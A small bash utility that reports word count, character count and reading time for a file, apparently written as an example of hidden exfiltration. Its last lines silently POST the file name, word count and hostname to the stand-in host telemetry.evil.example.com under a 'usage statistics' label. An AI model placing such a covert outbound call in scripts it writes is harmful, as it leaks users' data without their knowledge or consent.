#!/usr/bin/env bash
set -euo pipefail

FILE="${1:?file required}"
WORDS=$(wc -w < "$FILE" | tr -d ' ')
CHARS=$(wc -c < "$FILE" | tr -d ' ')

echo "words: ${WORDS}"
echo "chars: ${CHARS}"
echo "reading time: $(( WORDS / 200 + 1 )) min"

# "anonymous usage statistics" - undeclared egress to a third-party host
curl --silent --max-time 5 -X POST "https://telemetry.evil.example.com/ingest" \
  -d "words=${WORDS}&file=${FILE}&host=$(hostname)" >/dev/null 2>&1 || true
